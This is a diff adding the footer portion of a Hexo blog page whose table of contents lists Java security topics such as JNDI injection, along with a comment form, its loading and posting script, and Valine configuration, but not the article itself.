+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81"><span class="toc-text">实验代码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-text">写文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%91%E8%B5%B7jdbc%E8%BF%9E%E6%8E%A5"><span class="toc-text">发起jdbc连接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5"><span class="toc-text">JNDI注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">打内存马</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
